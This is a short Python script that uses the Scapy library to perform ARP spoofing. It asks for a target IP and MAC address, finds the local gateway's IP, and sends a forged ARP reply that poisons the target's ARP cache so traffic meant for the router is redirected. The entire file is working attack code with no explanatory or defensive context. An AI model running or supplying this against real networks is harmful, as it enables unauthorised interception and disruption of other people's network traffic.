from scapy.all import *

ip = input("enter ip to spoof: ")
mac = input("enter mac to spoof: ")
routerip = conf.route.route('8.8.8.8')[2]
packet = Ether() / ARP(pdst=ip, hwdst=mac, psrc=routerip, op=2)
sendp(packet)
